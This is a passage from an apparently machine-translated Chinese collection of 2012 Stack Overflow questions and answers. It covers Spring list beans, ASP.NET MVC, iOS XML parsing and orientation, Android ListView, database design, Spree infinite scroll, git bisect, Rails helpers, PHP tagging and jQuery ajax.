    public List<T> getObject() throws Exception {
        List<T> consolidatedList = new ArrayList<T>();
        consolidatedList.addAll(baseList);
        consolidatedList.addAll(extendedList);
        return consolidatedList;
    }

    @Override
    public Class<?> getObjectType() {
        return List.class;
    }

    @Override
    public boolean isSingleton() {
        return false;
    }
    public void setBaseList(List<T> baseList) {
        this.baseList = baseList;
    }

    public List<T> getExtendedList() {
        return extendedList;
    }

    public void setExtendedList(List<T> extendedList) {
        this.extendedList = extendedList;
    }

} 
```

and using it this way:

```
<bean name="normalInvRules" class="ListExpandingFactoryBean" p:baseList-ref="commonRules">
    <property name="extendedList">
        <list>
            <ref bean="bean4"/>
        </list>
    </property>
</bean> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-07T04:24:06.350

感谢您的回复。这就是我最终使用以下方法解决它的方式`Collection Merging`：

```
<bean id="rule1" class="com.krovi.rules.Rule1" />
<bean id="rule2" class="com.krovi.rules.Rule2" />
<bean id="rule3" class="com.krovi.rules.Rule3" />
<bean id="rule4" class="com.krovi.rules.Rule4" />
<bean id="rule5" class="com.krovi.rules.Rule5" />

<bean id="commonList"
    class="org.springframework.beans.factory.config.ListFactoryBean">
    <property name="sourceList">
        <list>
            <ref bean="rule1" />
            <ref bean="rule2" />
            <ref bean="rule3" />
        </list>
    </property>
</bean>
<bean id="firstExecutorRules" parent="commonList"
    class="org.springframework.beans.factory.config.ListFactoryBean">
    <property name="sourceList">
        <list merge="true">
            <ref bean="rule4" />
        </list>
    </property>
</bean>
<bean id="secondExecutorRules" parent="commonList"
    class="org.springframework.beans.factory.config.ListFactoryBean">
    <property name="sourceList">
        <list merge="true">
            <ref bean="rule5" />
        </list>
    </property>
</bean> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-06T14:33:49.173

您可以创建一个具有通用规则的类并将它们自动连接到其他规则中吗？那不行吗？

您可以使用 XML 配置采用相同的方法，也可以使用 ref 属性将其注入。

# asp.net-mvc - 文件上传器发布操作中的控制器属性为空

> ID：12760437
> 
> 赞同：-1
> 
> 时间：2012-10-06T13:58:47.043
> 
> 标签：asp.net-mvc, upload, controller, asp.net-mvc-4

我使用一个控制器上传文件（`UploadImageController`操作`AddFiles`返回部分视图）

在其他控制器中，它用作： `@{ Html.RenderAction(MVC.Admin.UploadImage.AddFiles(new MyImageService())); }`

其中 MyImageService 是有关上传路径、图像尺寸和其他 ( `MyImageService : IImageService`)信息的类

在`UploadImageController`我添加属性`IImageService _imageService { get; set; }` 和`AddFiles`操作：

```
public virtual PartialViewResult AddFiles(IImageService service)
{
    _imageService = service;
    return PartialView();
} 
```

当我尝试上传文件时

```
[HttpPost]
public virtual ActionResult UploadFiles()
{...} 
```

我的财产`_imageService == null`，为什么以及如何改变它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T16:58:33.340

[建议在构造](http://msdn.microsoft.com/en-us/vs2010trainingcourse_aspnetmvcdependencyinjection_topic2)函数中初始化Controller的字段（即在Action调用之前）：

```
private IImageService _imageService;
public UploadImageController(IImageService service) {
    _imageService = service;
} 
```

# objective-c - 解析 XML 文件 - 失去理智

> ID：12760439
> 
> 赞同：0
> 
> 时间：2012-10-06T13:59:22.500
> 
> 标签：objective-c, ios, ios6, nsxmlparser

我已经查看了所有内容，包括此处和 Google，以找到一种为 iOS6 解析 XML 文件的简单方法。我发现的一切都与下一个略有不同，导致我极度困惑。到目前为止，这就是我所拥有的：

XMLParser.h

```
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

@class Profile;

@interface XMLParser : NSObject <NSXMLParserDelegate>{
    NSData *profileData;

@private
    Profile *currentProfileObject;

    NSMutableArray *currentParsedBatch;
    NSMutableArray *currentParsedCharacterData;

    BOOL accumlatingParsedCharacterData;
    BOOL didAbortParsing;

    NSUInteger parsedProfilesCounters;
}

@property (copy, readonly) NSData *profileData;

-(id)initWithData:(NSData *)parseData;

@end 
```

我的 XMLParser.m

```
#import "XMLParser.h"
#import "Profile.h"

//Create a delegate
@interface XMLParser () <NSXMLParserDelegate>
    @property (nonatomic, retain) Profile *currentProfileObject;
    @property (nonatomic, retain) NSMutableArray *currentParsedBatch;
    @property (nonatomic, retain) NSMutableArray *currentParsedCharacterData;
@end

@implementation XMLParser
@synthesize profileData, currentProfileObject, currentParsedBatch, currentParsedCharacterData;

-(id)initWithData:(NSData *)parseData{
    if(self = [super init]){
        profileData = [parseData copy];
    }
    return self;
}

-(void)addProfilesToList:(NSArray *)profiles{
    assert([NSThread isMainThread]);

}

-(void)main{
    self.currentParsedBatch = [NSMutableArray array];
    self.currentParsedCharacterData = [NSMutableString string];

    NSXMLParser *parser = [[NSXMLParser alloc] initWithData:profileData];

    [parser setDelegate:self];
    [parser parse];

    if([self.currentParsedBatch count] > 0){
        [self performSelectorOnMainThread:@selector(addProfilesToList:) withObject:self.currentParsedBatch waitUntilDone:NO];
    }

    self.currentParsedBatch = nil;
    self.currentProfileObject = nil;
    self.currentParsedCharacterData = nil;

    parser = nil;
}

/*
-(void)dealloc{
    [profileData release];
    [currentParsedCharacterData release];
    [currentParsedBatch release];

    [super dealloc];
}
*/

-(void)parser:(NSXMLParser *)parser didStartElement:(NSString *)elementName namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qName attributes:(NSDictionary *)attributeDict{

    NSLog(@"Parsing...");

    if([elementName isEqualToString:@"profiles"]){
        Profile *profile = [[Profile alloc] init];
        self.currentProfileObject = profile;
        //[profile release];
        profile = nil;
    }
    else if([elementName isEqualToString:@"profile"]){
        NSLog(@"Parsing....");

        [self.currentProfileObject setLastName:[attributeDict valueForKey:@"lastName"]];
        [self.currentProfileObject setFirstName:[attributeDict valueForKey:@"firstName"]];
        [self.currentProfileObject setMobile:[attributeDict valueForKey:@"mobile"]];
        [self.currentProfileObject setPhone:[attributeDict valueForKey:@"phone"]];
        [self.currentProfileObject setEmail:[attributeDict valueForKey:@"email"]];
        [self.currentProfileObject setAltEmail:[attributeDict valueForKey:@"altEmail"]];
        [self.currentProfileObject setAddress:[attributeDict valueForKey:@"address"]];
        [self.currentProfileObject setCity:[attributeDict valueForKey:@"city"]];
        [self.currentProfileObject setState:[attributeDict valueForKey:@"state"]];
        [self.currentProfileObject setZipCode:[attributeDict valueForKey:@"zipCode"]];
        [self.currentProfileObject setProfilePicture:[attributeDict valueForKey:@"profilePicture"]];
    }
}

- (void)parser:(NSXMLParser *)parser didEndElement:(NSString *)elementName
  namespaceURI:(NSString *)namespaceURI
 qualifiedName:(NSString *)qName{

    if([elementName isEqualToString:@"profile"]){
        [self.currentParsedBatch addObject:self.currentProfileObject];
        parsedProfilesCounters++;

    }
    else if([elementName isEqualToString:@"profiles"]){
        return;

    }
}

@end 
```

现在在我的 appdelegate 文件中，我正在这样做：

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    // Override point for customization after application launch.

    NSString *xmlFile = [[NSBundle mainBundle] pathForResource:@"profileXML" ofType:@"xml"];
    NSData *xmlData = [[NSData alloc] initWithContentsOfFile:xmlFile];

    [[XMLParser alloc] init];

    MediDirectoryMasterViewController *masterViewController = [[MediDirectoryMasterViewController alloc] initWithNibName:@"MediDirectoryMasterViewController" bundle:nil];
    self.navigationController = [[UINavigationController alloc] initWithRootViewController:masterViewController];
    self.window.rootViewController = self.navigationController;
    [self.window makeKeyAndVisible];
    return YES;
} 
```

这些似乎都不起作用，因为我没有从日志中得到任何响应。如果你不知道，这是我写过的第一个 iOS 应用程序，所以我不确定如何处理所有这些。再次，由于我开始失去信心，我们非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T19:34:01.307

1.  如果您认为调用`[[XMLParser alloc] init];`会导致执行`XMLParser` `main`方法，那么您就错了。如果要调用该类的任何方法，则应该引用该类的实例，然后调用所需的方法。例如，在您的情况下：

    ```
    XMLParser *parser = [[XMLParser alloc] initWithData:xmlData];
    [parser main];
    [parser release]; 
    ```

2.  您的代码中还有很多其他错误需要花费大量时间来讨论。这就是为什么我建议您阅读 Apple Docs 中的一些简单示例，即[Your First iOS App](http://developer.apple.com/library/ios/#documentation/iphone/conceptual/iphone101/Articles/00_Introduction.html)。如果你不熟悉类和对象，你也应该阅读[面向对象编程](http://en.wikipedia.org/wiki/Object-oriented_programming)。

# android - Android listView 的背景图片真的很慢

> ID：12760445
> 
> 赞同：0
> 
> 时间：2012-10-06T13:59:51.047
> 
> 标签：android, performance, listview, background-image

我有以下问题：我正在使用带有主题背景图像的常规 ListView，这给我带来了很大的性能问题。当我删除窗口（见themes.xml）背景图像时，一切都变得光滑了。使用背景图像时，速度明显变慢。

我已经尝试过：

*   安卓：cacheColorHint="#00000000"
*   listview.setScrollingCacheEnabled(false);

但没有任何效果。我不明白为什么这么慢，因为 ListView 只是纯白色 - 不应该是一个问题......

主题.xml：

```
 <item name="android:windowBackground">@drawable/window_bg</item> 
```

列表.xml

```
<RelativeLayout 
  xmlns:android="http://schemas.android.com/apk/res/android"
  android:layout_width="fill_parent"
  android:layout_height="fill_parent"
  android:orientation="vertical"
  android:padding="10dp">
  <ListView
        android:id="@+id/my_list"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:background="@color/white"/>
</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T14:57:03.827

If it's just a white background, then see if you can just set the background color to white instead of using a drawable. Things will speed up instantly!

# database - 新手数据库：一张表的外键相同？

> ID：12760446
> 
> 赞同：1
> 
> 时间：2012-10-06T13:59:51.707
> 
> 标签：database

我正在尝试构建一个为自己存储食物食谱的 Java 程序。该程序应该能够存储、搜索和更改存储在数据库中的食谱。目前我正在使用 Access 2003，因为我已经习惯了它，但我很可能稍后会使用 MySQL。

这里的问题很可能是非常基本的，但我遇到的问题是实现我的逻辑模型，我想知道如何解决这个问题，或者是否有更好的方法来做到这一点。

所以事情就是这样，这是一个具体的例子：我想在数据库中存储成分，比如“胡萝卜”。然而，许多项目都有替代名称，特别是因为我什至不是英语所以：假设 Carrot 是英语中的 Carrot。现在，Carrot 在我的语言中是“Morot”。也许稍后我看杰米奥利弗的节目，他把胡萝卜叫做“shapdoodles”之类的东西。

我想存储这些成分的原因是因为如果我添加这三个食谱，然后在搜索“胡萝卜”时，我希望程序不仅列出涉及胡萝卜的食谱，还列出 morot 和 shapdoodles，因为它们也是胡萝卜，只是名称不同！

这听起来很简单，起初我认为这就像拥有一个带有一个文本字段的“成分”表一样简单。该文本将是一个主键，它将存储成分名称，例如“carrot”或“shapdoodle”。该表将与表“Ingredientlist”连接，而 Ingredientlist 将导致“RecipeDescription”等。

我假设我可以简单地添加另一个带有两个文本字段（名称和备用名称）的表，并将成分的文本字段作为这两个文本字段的外键，这两个文本字段一起用作表的主键。我有点想这样的结果：

```
AlernateIngredientTable:
carrot  shapdoodle
carrot morot 
```

依此类推……因此，稍后我可以简单地发送查询以查找此表中与“胡萝卜”相关的所有内容，然后从那里找到与胡萝卜、shapdoodles 或 morot 相关的食谱。

好吧，由于我无法将相同的外键添加到表中的两个字段，我有点迷路了！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:21:04.530

您应该更改您的模型并创建一个将成分与其所有名称相关联的表。与胡萝卜等效的每种成分都将具有相同的标识。这是一个例子：

```
table Ingredient(id, name)

id    Name
---------------
1    carrot
1    shapdoodle
1    morot
2    potato
2    patata
3    sugar
3    brownsugar
3    anothernameforSugar 
```

还有一张食谱表：

```
table recipe(id, name, preparation_time)
1    carrot cake    45 
```

将食谱与其成分相关联的第三张表

```
table recipeToIngredient(recipeId, ingredientId)
1    1
1    3 
```

在这个例子中，我定义了一个 ID 为 1 的“胡萝卜蛋糕食谱” 这个食谱有 2 种成分：胡萝卜（表“成分”中的 ID 1）和糖（ID 3）

要检索所有涉及胡萝卜/morots/etc 的食谱：

```
SELECT recipe.name FROM recipeToIngredient, recipe
WHERE recipeToIngredient.recipeId=recipe.id
AND ingredient.id = recipeToIngredient.ingredientId 
AND recipeToIngredient.ingredientId = (SELECT id FROM ingredients WHERE name'carrot') 
```

基本上，我们在这里所做的是为成分放置一个“id”字段，而不是使用成分名称作为主键的模型。这样，虽然名称会根据语言而变化，但给定成分的 id 始终相同，并且您可以根据 id 而不是成分名称运行查询。

让我知道我是否可以提供更多帮助/解释。

# jquery - 产品页面的 Rails Spree Kaminari 无限滚动

> ID：12760447
> 
> 赞同：3
> 
> 时间：2012-10-06T13:59:57.710
> 
> 标签：jquery, ruby-on-rails, spree, infinite-scroll, kaminari

我尝试使用本教程[Kaminari 无尽页面](https://github.com/fschwahn/endless_page)，还观看了 Ryan Bates[第 114 集 Endless Page（修订版）](http://railscasts.com/episodes/114-endless-page-revised)，并尝试在我的在线商店中实现无限滚动功能。

我不确定如何在我的 index.js.erb 文件中应用产品渲染，因为它在 Spree 中实现的完全不同。我还忘了提到我对 Spree 平台还很陌生。

到目前为止，我所做的只是更改这些文件：

意见/狂欢/产品/index.html

```
<% content_for :sidebar do %>
<div data-hook="homepage_sidebar_navigation">
  <% if "products" == @current_controller && @taxon %>
      <%= render :partial => 'spree/shared/filters' %>
  <% else %>
      <%= render :partial => 'spree/shared/taxonomies' %>
  <% end %>
</div>
<% end %>

<% if params[:keywords] %>
<div data-hook="search_results">
  <% if @products.empty? %>
      <h6 class="search-results-title"><%= t(:no_products_found) %></h6>
  <% else %>
      <%= render :partial => 'spree/shared/products', :locals => { :products => @products, :taxon => @taxon } %>
  <% end %>
</div>

<% else %>
<div id="home-products">
  <div data-hook="homepage_products">
    <%= render :partial => 'spree/shared/products', :locals => { :products => @products, :taxon => @taxon } %>
  </div>
</div>

<% end %> 
```

意见/狂欢/产品/index.js.erb

```
$("#home-products").append('<%= j render(:partial => 'spree/shared/products', :locals => { :products => @products, :taxon => @taxon }) %>');
<% if @products.next %>
   $('.pagination').replaceWith('<%= j paginate(@products) %>');
<% else %>
   $('.pagination').remove();
<% end %> 
```

这是部分视图/spree/shared/_products.html.erb

```
<%
  paginated_products = @searcher.retrieve_products if params.key?(:keywords)
  paginated_products ||= products
%>
<% if products.empty? %>
  <%= t(:no_products_found) %>
<% elsif params.key?(:keywords) %>
  <h6 class="search-results-title"><%= t(:search_results, :keywords => h(params[:keywords])) %></h6>
<% end %>

<% if products.any? %>
<ul id="products" class="inline product-listing" data-hook>
  <% reset_cycle('default') %>
  <% products.each do |product| %>
    <% if Spree::Config[:show_zero_stock_products] || product.has_stock? %>
      <li id="product_<%= product.id %>" class="columns three <%= cycle("alpha", "secondary", "", "omega secondary", :name => "classes") %>" data-hook="products_list_item" itemscope itemtype="http://schema.org/Product">
        <div class="product-image">
          <%= link_to small_image(product, :itemprop => "image"), product, :itemprop => 'url' %>
        </div>
        <%= link_to truncate(product.name, :length => 50), product, :class => 'info', :itemprop => "name", :title => product.name %>
        <span class="price selling" itemprop="price"><%= number_to_currency product.price %></span>
      </li>
    <% end %>
  <% end %>
  <% reset_cycle("classes") %>
</ul>
<% end %>

<% if paginated_products.respond_to?(:num_pages) %>
  <%= paginate paginated_products %>
<% end %> 
```

资产/javascripts/store/products.js.coffee

```
jQuery ->

  if $('.pagination').length
    $(window).scroll ->
       url = $('.pagination .next').attr('href')
       if url && $(window).scrollTop() > $(document).height() - $(window).height() - 50
         $('.pagination').text("Fetching more products...")
         $.getScript(url)
       $(window).scroll() 
```

在这里，根据 Ryan 剧集的一些评论，我只将 '.next_page' 更改为 '.next'。

我很确定问题与部分有关，因为它不是直接渲染产品，但我不知道如何更改它以使其正常工作。

谁能帮我这个？谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-19T16:45:30.467

看起来我没有渲染正确的部分
解决我的问题的内容是：

> 查看/狂欢/产品/index.js.erb

```
<%= render 'spree/shared/products.js.erb' %> 
```

我还为产品创建了一个新的 js 部分，因为那是我实际上应该进行分页的地方。

> 查看/狂欢/共享/_products.js.erb

```
$('ul#products').append('<%= j render(:partial => 'spree/shared/product', :collection => @products) %>');

<% if @products.current_page < @products.total_pages %>

$('.pagination').replaceWith('<%= j paginate @products %>')
BWLD.can_scroll = true

<% else %>

$('.pagination').remove();

<% end %> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-07-03T06:15:41.167

我为仍在 Solidus 上寻找此答案的任何人找到了解决方案。

从此 repo 添加这两个文件：[https ://github.com/gildardoperez/spree_infinite_scroll/tree/master/app/assets/javascripts/store](https://github.com/gildardoperez/spree_infinite_scroll/tree/master/app/assets/javascripts/store)

到您的供应商目录如下例所示：

`vendor/assets/javascripts/spree/frontend/jquery.infinitescroll.js` `vendor/assets/javascripts/spree/frontend/spree_infinite_scroll.js`

并确保检查您是否使用在`spree_infinite_scroll.js`您的应用程序文件中找到的相同类。

重新加载您的服务器并加载[http://localhost:3000/products](http://localhost:3000/products)还确保在您的页面中指定要呈现的产品数量`app/config/initializers/spree.rb`

```
Spree.config do |config|
  config.currency = "USD"
  ....
  config.products_per_page = 10
end 
```

# git - 如何使用 git bisect：使用单元测试来确定错误提交？

> ID：12760450
> 
> 赞同：9
> 
> 时间：2012-10-06T14:00:19.693
> 
> 标签：git, unit-testing, git-bisect

我是 git 新手，刚刚发现“git bisect”。当您可以使用新编写的单元测试（之前不存在）检查错误时，通常如何使用它？

假设我们有一个包含单元测试的存储库，但是 - 通常 - 它们并不完整。在某些版本中，我们发现某个功能不起作用，但我们知道它在之前的某个版本中存在。不幸的是，该功能没有通过单元测试检查。我现在想做的是：

1.  编写测试用例（当然首先失败）
2.  使用此测试用例查找使用 git bisect 引入错误的提交
3.  更正错误并提交修复（和测试用例）

这个用例有一个问题。当 git bisect 检查旧版本时，刚刚插入的测试用例将不存在，所以我不能用它来检查错误。我可以尝试不提交测试，而是将其保留为本地更改。但是想象一下测试文件在中间的某个版本中发生了更改，我很可能会遇到合并冲突。

那么该怎么办？git bisect 一般如何使用？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-06T14:10:54.667

我通常使用 bisect 来识别何时引入了错误，以便我可以查看单个提交以查找错误原因。当我知道某些东西曾经有效而现在无效时，这很有用。我首先选择或找到一个有效的旧提交，用 标记它，用`git bisect good`标记头部`git bisect bad`，然后通过 bisect 工作，直到 git 告诉我引入问题的提交。有时我可以在开始这个过程之前编写单元测试，有时我无法编写它，直到我看到引入错误的代码。

所以，假设我有单元测试，或者在通过 git bisect 过程时需要在每个点使用的其他一些代码或脚本。在我走的时候，藏匿处对持有它很有用。所以，

```
git stash save blah
git bisect bad (and now I'm on a new commit)
git stash pop
mvn clean test

git stash save blah
git bisect good
git stash pop
mvn clean test 
```

等等。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T14:12:49.683

*首先，在尝试此操作之前，请确保您`git status`是干净的 - 我建议使用会调用的脚本`git reset --hard`，因此任何未提交的更改都会丢失。*

一种方法是首先将最近测试的源代码复制到存储库历史中从未跟踪过的某个位置（或存储库之外的某个位置）。然后编写一个脚本：

1.  将最近的测试复制到源代码树中
2.  运行测试，保存返回码。
3.  是否`git reset --hard`清除步骤 1 中的更改
4.  使用从 2 保存的返回码退出。

然后，在将两个提交标记为好和坏以`git bisect`从某个地方开始之后，您可以使用它`git bisect run YOUR-SCRIPT`来查找最近的单元测试可能失败的第一个提交。

这种方法本质上是[文档中建议的`git bisect run`](http://git-scm.com/docs/git-bisect)方法，其中说：

> 您可能经常会发现，在对分会话期间，您希望进行临时修改（例如，头文件中的 s/#define DEBUG 0/#define DEBUG 1/，或“没有此提交的修订需要应用此补丁才能解决此二分法不感兴趣的另一个问题”）应用于正在测试的修订版。
> 
> 为了应对这种情况，在内部 git bisect 找到下一个要测试的修订后，脚本可以在编译前应用补丁，运行真正的测试，然后确定修订（可能带有所需的补丁）是否通过测试和然后将树倒回原始状态。最后，脚本应该以真实测试的状态退出，让“git bisect run”命令循环确定 bisect 会话的最终结果。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-06T14:16:05.087

您没有提到您使用的是哪种技术，所以我将使用 Ruby 作为示例，这是我最熟悉的。不过，同样的原则也应该适用于其他技术。

1.  将最新的测试文件放在项目目录*之外*。在这里，我假设它已开启`/tmp/my_test.rb`

2.  在您的存储库中，创建一个小的 shell 脚本，例如`test_runner.sh`：

    ```
    #!/usr/bin/env sh    
    cp -f /tmp/my_test.rb test/my_test.rb # This will potentially overwrite some old test file
    ruby test/my_test.rb # Change for whatever test runner you use
    test_result=$?
    git checkout test/my_test.rb # Undoes any changes that might have been made
    exit $test_result 
    ```

3.  将提交标记为好/坏，通常使用`bisect`.

4.  在 git 为您找到错误时，使用`git bisect run test_runner.sh`并去喝杯咖啡。

# javascript - 如何通过 YouTube API 获取“（艺术家）的热门曲目”URL？

> ID：12760453
> 
> 赞同：1
> 
> 时间：2012-10-06T14:01:08.767
> 
> 标签：javascript, jquery, api, youtube-api, asp.net-web-api

有什么方法可以通过 YouTube API 以编程方式获取 YouTube 上“（艺术家）的热门曲目”播放列表的 URL？唯一的输入应该是艺术家姓名（例如“ABBA”），输出应该是“ABBA 的热门曲目”播放列表的地址，即：

[http://www.youtube.com/watch?v=xFrGuyw1V8s&feature=list_other&playnext=1&list=AL94UKMTqg-9CB-lr-bPA_nrB-AW5RlrYV](http://www.youtube.com/watch?v=xFrGuyw1V8s&feature=list_other&playnext=1&list=AL94UKMTqg-9CB-lr-bPA_nrB-AW5RlrYV)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-03T04:28:23.203

@Ognjen：我有同样的问题 - 可以通过 youtube-api 吗？

**编辑：** 我发现这个 [检索 YouTube 迪斯科播放列表](https://stackoverflow.com/questions/7819651/retrieving-a-youtube-disco-playlist)

但是 OP 也有同样的问题，我认为这是一个解决方案。

# windows-phone-7 - 如何在 MediaElement 中播放来自媒体库的音频文件

> ID：12760455
> 
> 赞同：1
> 
> 时间：2012-10-06T14:01:18.660
> 
> 标签：windows-phone-7, xna

我想播放存储在`MediaLibrary`. 我希望使用`MediaElement`而不是`MediaPlayer`.

我之所以要这样做是因为我希望能够利用 MediaElement 的 position 属性。

我在网上找到[了这个](http://social.msdn.microsoft.com/forums/en-us/wphowto/thread/906f22bd-bad4-42c6-844f-4646c84950f9)，但仍然没有答案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T22:12:01.270

没有开箱即用的 API 可让您通过未绑定到 OS shell 的控件访问媒体库内容，特别是音频内容。因此，简单地说 -**在 Windows Phone 7 上无法做到这一点**。

# ruby-on-rails-3 - 在 Rails (HAML) 中将 css 类添加到 select_year 助手

> ID：12760456
> 
> 赞同：2
> 
> 时间：2012-10-06T14:01:19.797
> 
> 标签：ruby-on-rails-3, ruby-on-rails-3.2

我想写这段代码

```
<select name="date[birth]" id="date_birth" class = "span1">
      <option value="2011">2011</option>
      <option value="2012" selected="selected">2012</option>
      <option value="2013">2013</option>
      </select> 
```

在 Rails 中，它有 select_year 助手，我只是写

```
= select_year(Date.today, :field_name => "birth", :start_year => 2011, :end_year => 2013) 
```

我尝试通过属性向它添加 css 类`:class => "span1"`，但它不起作用！请帮助我，谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-06T17:23:43.837

```
= select_year(Date.today, {:field_name => "birth", :start_year => 2011, :end_year => 2013}, {:class => "span1"}) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T19:03:44.077

是的，答案是@aromero 提供的。您需要`:class => "span1"`在单独的哈希中添加。

如果您查看[**了函数声明**](http://apidock.com/rails/ActionView/Helpers/DateHelper/select_year)并且无法实现，我试图解释这一点。

函数定义是

```
select_year(date, options = {}, html_options = {}) 
```

看，它实际上采用了三个参数，

*   **日期：**当前日期
*   **选项：**与显示信息相关的参数哈希
*   **html_options：**显示 html 标签的相关参数的哈希值。

因此，在您的情况下，添加类名实际上是`html_options`. 因此，您需要将这两个哈希分开并添加`class_name`最后一个。

这一点很重要，因为有很多 rails helper 以这种方式获取参数。并且始终参考[**apidock.com/rails**](http://apidock.com/rails)或[**guides.rubyonrails.org**](http://guides.rubyonrails.org)以清楚地了解任何 api。

# ios - iPad 上的 UIViewController 处理方向 iOS 6.0

> ID：12760457
> 
> 赞同：3
> 
> 时间：2012-10-06T14:01:24.493
> 
> 标签：ios, ipad, uiviewcontroller, ios6

在我的应用程序中，我需要为我的`ViewControllers`.

1.  `ViewController1`必须只支持横向。
2.  `ViewController2`必须支持横向+纵向。

我在 Summury 项目中启用了所有这样的方向：

![总结项目方向](../Images/65fdcdfeb19c27783080200640b7f689.png)

所以，我将此代码插入`ViewController1`：

```
- (BOOL)shouldAutorotate
{
    return YES;
}

- (NSUInteger)supportedInterfaceOrientations
{
    return UIInterfaceOrientationMaskLandscape;
} 
```

我将此代码插入`ViewController2`：

```
- (BOOL)shouldAutorotate
{
    return YES;
}

- (NSUInteger)supportedInterfaceOrientations
{
    return UIInterfaceOrientationMaskAll;
} 
```

问题是它`ViewController1`也可以纵向旋转（它应该只支持横向）。

任何想法？

非常感谢大家！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:25:34.587

你的 viewController 是你的 rootViewController 吗？如果没有，那可能是你的问题。

如果您的 rootViewController 是 UINavigationController，您应该知道它不会将这些消息转发到它的 topViewController。因此，如果这是您的情况，我建议您使用 UINavigationController 的子类，在其中覆盖这些新方法以转发到 topViewController。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T16:46:24.977

在 iOS 6 之前，这工作正常

```
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientatio n { if (UIInterfaceOrientationIsLandscape(interfaceOrientation)) return YES;

else return NO; } 
```

但在 iOS 6 中已弃用

现在您应该指定想要的方向并选择演示的方向

你应该写

```
- (NSUInteger)supportedInterfaceOrientations { return UIInterfaceOrientationMaskLandscape; }

- (UIInterfaceOrientation)preferredInterfaceOrientationForPresentation { return UIInterfaceOrientationLandscapeRight; } 
```

希望能帮助到你

祝你好运

# php - 处理标签

> ID：12760463
> 
> 赞同：2
> 
> 时间：2012-10-06T14:02:04.360
> 
> 标签：php, mysql, database-design, autocomplete, tagging

我们正计划使用类似于在该站点上实施的标记系统。

我们有实际的标记前端，自动完成等工作。

但我对在后端处理它的最佳方式感到困惑。

基本上，当我们在后端获取标签时，我们最终会得到一个如下所示的数组：

```
array(
  array(
    'value' => 1,
    'label' => 'First Tag'
  ),
  array(
    'value' => 2,
    'label' => 'Second Tag'
  ),
  array(
    'value' => 'Third Tag',
    'label' => 'Third Tag'
  ),
  array(
    'value' => 3,
    'label' => 'Fourth Tag'
  ),
) 
```

`json_encode()`标记插件在自动完成时也会通过 ajax接收相同的数组格式，它会显示标签，并存储 id 以便可以将其发回。

因此，值为`1`,`2`的`3`标签是从自动完成中选择的标签。
值为 的标签`Third Tag`是未从自动完成中选择的标签，它可能已存在或可能不存在于数据库中，但已手动输入。

现在有一个变化，用户实际上可以创建一个恰好是数字的标签，因此

```
array(
  'value' => 3,
  'label' => 3
) 
```

可以通过，但不存在，所以我们不能假设如果 value 是 int 那么它已经存在。

所以，这个问题的第一部分是，我如何管理这个，这样我就不会得到重复的标签？

我目前的方法是，当标记插件通过自动完成请求标记时，我发回一个数组，例如

（术语='别针'）

```
array(
  array(
    'value' => '||1',
    'label' => 'pink'
  ),
  array(
    'value' => '||4',
    'label' => 'pin cushion'
  )
) 
```

然后在后端假设任何具有以 || 开头的值的标签 来自自动完成并且已经存在。

然后，我们查询数据库中的所有标签，我们检查其余的标签以找出`value`数组的`label`键是否存在，如果存在，我们就保持原样，如果不存在，我们创建它，然后我们用`id`原始数组中的新值切换出值。

但这对我来说感觉很奇怪，这意味着我们正在使用填充项（`||`）必须有一种更优雅的方式来做到这一点？

问题的下一部分是，实际上将这些标签链接到一个项目。这更多是在本网站上编辑问题的背景下，

一些标签已经与问题相关联。你如何处理它，这样你就不会在一个问题上出现重复的标签引用？

到目前为止，我看到了两个选项：从问题中删除所有指向标签的链接，然后再次将它们全部插入。（2 个查询）
或
在数据库中查询连接到问题的所有标签，遍历数组，从数组中删除这些标签，然后插入剩余部分。（2 个查询）

任何一种方法都比另一种更好吗？还是有第三个版本？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:22:48.313

通过在相关字段上添加唯一约束，可以在数据库级别解决任何类型的重复键问题。您的所有代码与标签的交互都应使用文本标签完成，该标签应作为标签的唯一标识符。任何类型的数字 ID 对应用程序本身没有任何用途，因此无需从存储库层后面窥视。这也将解决区分现有/新标签的问题......实际上应用程序并不关心，它将标签视为持久的值对象，而不是担心任何类型的实体样式生命周期。在标签与文章关联的存储库调用中，如果标签尚不存在，则创建该标签。

更新标签（包括删除）最安全和最简单的选择是炸毁现有标签并编写新标签。这确保了持久化状态完全一致地匹配 UI 输入，实际上这不会是一个昂贵的操作，也不会经常执行到足以关心（尽管一个简单的程序检查以查看是否需要更新将有助于防止不必要的写）。这是 2 个查询应该包装在一个事务中并且可以一起批处理，只要有适当的索引，DELETE 就应该非常便宜，所以它不是您需要担心的那种多重查询。

如果出于某种奇怪的原因您过于担心最小化数据库的工作，您可以事先存储标签的一个版本，然后再执行适合增量的查询，但这要脆弱得多，并且还可能引入许多复杂的并发问题。

# ajax - jquery ajax 完成并失败

> ID：12760474
> 
> 赞同：0
> 
> 时间：2012-10-06T14:03:33.260
> 
> 标签：ajax, jquery

我有这个代码：

```
$.when(saveData()).done(alert('ok')).fail(alert('not ok')); 
```

结果是“ok”和“not ok”都被警告。

